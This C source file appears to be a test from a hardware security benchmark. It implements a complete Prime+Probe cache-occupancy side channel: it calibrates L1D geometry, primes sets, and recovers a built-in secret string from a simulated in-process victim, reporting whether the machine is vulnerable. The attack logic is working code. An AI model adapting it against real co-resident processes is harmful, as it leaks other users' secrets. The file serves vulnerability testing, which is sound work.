/**
 * prime-probe: cache-occupancy side channel (Prime+Probe), multi-symbol.
 *
 * The attacker primes every cache set with its own congruent lines, the victim
 * architecturally accesses a line mapping to a secret-dependent set (evicting
 * one attacker line), and the attacker probes its own lines to find which set
 * suffered a miss.  No shared line is needed (unlike Flush+Reload): the channel
 * is cache-set occupancy.
 *
 * The L1D conflict stride and associativity are calibrated at runtime (the
 * board geometry is not assumed): scan candidate strides, find the smallest
 * one where filling a set evicts its first line, and count the ways.  The
 * secret's cache set (secret mod sets) is then recovered per byte.
 */
#include "bench.h"

#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 100
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif
#define PP_MAX_WAYS 32
#define PP_MAX_SETS 512

static uint8_t pp_buf[1u << 20] __attribute__((aligned(SC_PAGE_BYTES)));
static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";

static uint32_t pp_stride; /* conflict stride (bytes) */
static int pp_ways;        /* associativity */
static int pp_sets;        /* number of sets */

static inline volatile uint8_t *pp_line(int set, int way) {
  return pp_buf + (uintptr_t)set * 64 + (uintptr_t)way * pp_stride;
}

/* A miss is any access measurably slower than the L1 hit floor. */
static inline int pp_is_miss(uint32_t t, const sc_geom_t *g) {
  return t > g->t_l1 + 3;
}

/* Calibrate conflict stride and ways. */
static int pp_calibrate(const sc_geom_t *g) {
  static const uint32_t strides[] = {1024, 2048, 4096, 8192, 16384, 32768};
  for (unsigned si = 0; si < sizeof(strides) / sizeof(strides[0]); si++) {
    uint32_t S = strides[si];
    /* fill way 0..PP_MAX_WAYS of set 0, see if line 0 evicts */
    sc_evict_capacity(g);
    (void)*pp_buf;
    sc_fence();
    int ways = -1;
    for (int k = 1; k <= PP_MAX_WAYS; k++) {
      (void)*(volatile uint8_t *)(pp_buf + (uintptr_t)k * S);
      sc_fence();
      if (pp_is_miss(sc_timed_load(pp_buf), g)) {
        ways = k; /* k-th conflicting line evicted line 0 => ways = k */
        break;
      }
    }
    if (ways > 0) {
      pp_stride = S;
      pp_ways = ways;
      pp_sets = (int)(S / 64);
      if (pp_sets > PP_MAX_SETS)
        pp_sets = PP_MAX_SETS;
      return 0;
    }
  }
  return -1;
}

static void prime_all(void) {
  for (int s = 0; s < pp_sets; s++)
    for (int w = 0; w < pp_ways; w++)
      (void)*pp_line(s, w);
  sc_fence();
}

/* Probe every way of every set; count misses per set; return argmax set. */
static int probe_evicted_set(const sc_geom_t *g, uint32_t *miss_count) {
  for (int s = 0; s < pp_sets; s++)
    for (int w = 0; w < pp_ways; w++)
      if (pp_is_miss(sc_timed_load(pp_line(s, w)), g))
        miss_count[s]++;
  int best = 0;
  for (int s = 1; s < pp_sets; s++)
    if (miss_count[s] > miss_count[best])
      best = s;
  return best;
}

int main(void) {
  if (sc_time_selfcheck("prime-probe") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (pp_calibrate(&g) != 0) {
    printf("SCRESULT prime-probe SKIP reason=no-conflict-stride\n");
    printf("[prime-probe] SKIP: could not calibrate L1D geometry\n");
    return 0;
  }
  printf("[prime-probe] geometry: stride=%u ways=%d sets=%d\n",
         (unsigned)pp_stride, pp_ways, pp_sets);
  uint32_t R = SECURITY_ATTACK_ROUNDS;
  int mask = pp_sets - 1;

  /* Positive control: prime, victim accesses a known set, probe finds it. */
  int pos_ok_cnt = 0;
  int want0 = 0x54 & mask;
  for (uint32_t r = 0; r < R; r++) {
    prime_all();
    (void)*pp_line(want0, pp_ways); /* victim: way pp_ways evicts a primed way */
    sc_fence();
    uint32_t mc[PP_MAX_SETS] = {0};
    int got = probe_evicted_set(&g, mc);
    if (got == want0)
      pos_ok_cnt++;
  }
  int pos_ok = pos_ok_cnt >= (int)R / 2;
  printf("[prime-probe] positive control %d/%u\n", pos_ok_cnt, (unsigned)R);

  int matched = 0;
  printf("[prime-probe] leaking %d cache-set symbols (secret mod %d):\n",
         SECURITY_SECRET_LEN, pp_sets);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    int want = (uint8_t)secret_str[i] & mask;
    uint32_t miss_count[PP_MAX_SETS] = {0};
    for (uint32_t r = 0; r < R; r++) {
      prime_all();
      (void)*pp_line(want, pp_ways);
      sc_fence();
      probe_evicted_set(&g, miss_count);
    }
    int got = 0;
    for (int s = 1; s < pp_sets; s++)
      if (miss_count[s] > miss_count[got])
        got = s;
    int ok = (got == want);
    matched += ok;
    printf("  [%2d] want_set=%2d got_set=%2d misses=%u/%u %s\n",
           i, want, got, (unsigned)miss_count[got], (unsigned)R,
           ok ? "OK" : "miss");
  }
  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT prime-probe %s pos=%d sets=%d rounds=%u\n",
         pos_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, pp_sets,
         (unsigned)R);
  printf("SCRESULT prime-probe-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  if (multibit_ok)
    printf("[prime-probe] VULNERABLE: Prime+Probe cache-set channel works\n");
  else if (!pos_ok)
    printf("[prime-probe] INCONCLUSIVE: positive control failed\n");
  else
    printf("[prime-probe] NOT VULNERABLE or insufficient signal\n");
  return 0;
}